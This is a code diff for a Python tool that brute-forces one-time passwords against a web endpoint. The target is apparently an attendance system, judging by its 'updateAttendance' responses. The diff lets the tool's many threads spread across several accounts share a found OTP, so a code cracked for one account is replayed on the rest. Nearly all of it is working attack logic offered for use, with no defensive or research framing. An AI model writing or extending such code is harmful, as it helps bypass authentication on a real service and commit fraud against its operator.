@@ -105,7 +105,7 @@ def check_otp(otp, url=None, headers=None):
 
 import random
 
-def run_attack_core(target_url, target_headers, num_threads, cooldown, account_name="Unknown", stop_event=None, print_lock=None, range_start=0, range_end=1000):
+def run_attack_core(target_url, target_headers, num_threads, cooldown, account_name="Unknown", stop_event=None, print_lock=None, range_start=0, range_end=1000, shared_context=None):
     """
     Core function to run the multi-threaded attack for a specific configuration.
     args:
@@ -113,6 +113,7 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
         print_lock: Optional threading.Lock shared across accounts. If None, creates local one.
         range_start: Start of OTP range (inclusive).
         range_end: End of OTP range (exclusive).
+        shared_context: Optional dict {'found_otp': None} shared across accounts.
     """
     # Setup synchronization primitives
     is_main_monitor = False
@@ -146,6 +147,26 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
             if stop_event.is_set() or success_event.is_set():
                 return
             
+            # Check Shared Context for globally found OTP
+            if shared_context and shared_context.get('found_otp'):
+                global_otp = shared_context['found_otp']
+                # If we haven't found it locally yet, try to use the global one
+                if not found_otp[0]:
+                    with print_lock:
+                         print(font(f" [{account_name}] [Thread {thread_id}] detected Global Found OTP: {global_otp}. Syncing...", color="magenta"))
+                    
+                    # Try to apply the found OTP to this account
+                    resp, err = check_otp(global_otp, url=target_url, headers=target_headers)
+                    with print_lock:
+                        if resp and 'data' in resp and resp['data'] and resp['data'].get('updateAttendance'):
+                             print(font(f" [{account_name}] [Thread {thread_id}] [SYNC SUCCESS] OTP Validated: {global_otp} ", color="green", inverse=True))
+                             found_otp[0] = global_otp
+                        else:
+                             print(font(f" [{account_name}] [Thread {thread_id}] [SYNC FAILED] Global OTP {global_otp} was rejected.", color="red"))
+                    
+                    success_event.set()
+                return
+
             # Make request
             response_json, error = check_otp(otp, url=target_url, headers=target_headers)
             
@@ -158,6 +179,11 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
                     with print_lock:
                         print(font(f"\n [{account_name}] [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
                         found_otp[0] = otp
+                    
+                    # Update global context
+                    if shared_context:
+                        shared_context['found_otp'] = otp
+                        
                     success_event.set()  # Signal all threads for THIS account to stop
                     return
                 
@@ -178,11 +204,20 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
             while slept < cooldown:
                 if stop_event.is_set() or success_event.is_set():
                     return
+                # Check shared context during sleep too for faster reaction
+                if shared_context and shared_context.get('found_otp'):
+                     # We can just return, let the next loop iteration handle the sync logic or simply exit
+                     # Actually, to trigger the sync logic, we should probably break to the top of the loop or re-call logic.
+                     # But cleanest is to let top of loop handle it.
+                     pass 
+                     
                 time.sleep(0.05)
                 slept += 0.05
         
         with print_lock:
-            print(font(f" [{account_name}] [Thread {thread_id}] Completed assigned chunk", color="cyan"))
+            # Only print if we didn't succeed/cancel
+            if not stop_event.is_set() and not success_event.is_set():
+                print(font(f" [{account_name}] [Thread {thread_id}] Completed assigned chunk", color="cyan"))
     
     # Distribute the randomized OTPs to chunks
     chunk_size = len(all_otps) // num_threads
@@ -201,7 +236,7 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
     
     # Start all threads
     with print_lock:
-        print(font(f" [{account_name}] Threads running with randomized OTPs...", color="cyan"))
+        print(font(f" [{account_name}] Threads running...", color="cyan"))
     
     for thread in threads:
         thread.start()
@@ -221,6 +256,10 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
                 if stop_event.is_set():
                     break
             
+            # Also check success event
+            if success_event.is_set():
+                break
+
             time.sleep(0.1)
             
     except KeyboardInterrupt:
@@ -239,13 +278,11 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
         with print_lock:
             print(font(f"\n [{account_name}] [FINAL RESULT] OTP Found: {found_otp[0]} ", color="green", inverse=True))
     elif stop_event.is_set():
-        # Only print cancelled if we are the ones handling it or just once? 
-        # In multi-mode we might get spam "Cancelled". Let's reduce noise.
         with print_lock:
             print(font(f" [{account_name}] Stopped.", color="yellow"))
     else:
         with print_lock:
-            print(font(f"\n [{account_name}] Finished range. No valid OTP found.", color="cyan"))
+            print(font(f"\n [{account_name}] Finished range.", color="cyan"))
 
     return found_otp[0]
 
@@ -398,6 +435,10 @@ def run_multi_account_attack():
     
     shared_stop_event = threading.Event()
     shared_print_lock = threading.Lock()
+    
+    # Shared context to store the found OTP
+    shared_context = {'found_otp': None}
+    
     results = {}
     
     # Wrapper helper to run in thread and capture result
@@ -407,7 +448,8 @@ def run_multi_account_attack():
                               stop_event=shared_stop_event, 
                               print_lock=shared_print_lock,
                               range_start=start_r,
-                              range_end=end_r)
+                              range_end=end_r,
+                              shared_context=shared_context)
         results[acc_name] = res if res else "Failed"
 
     account_threads = []
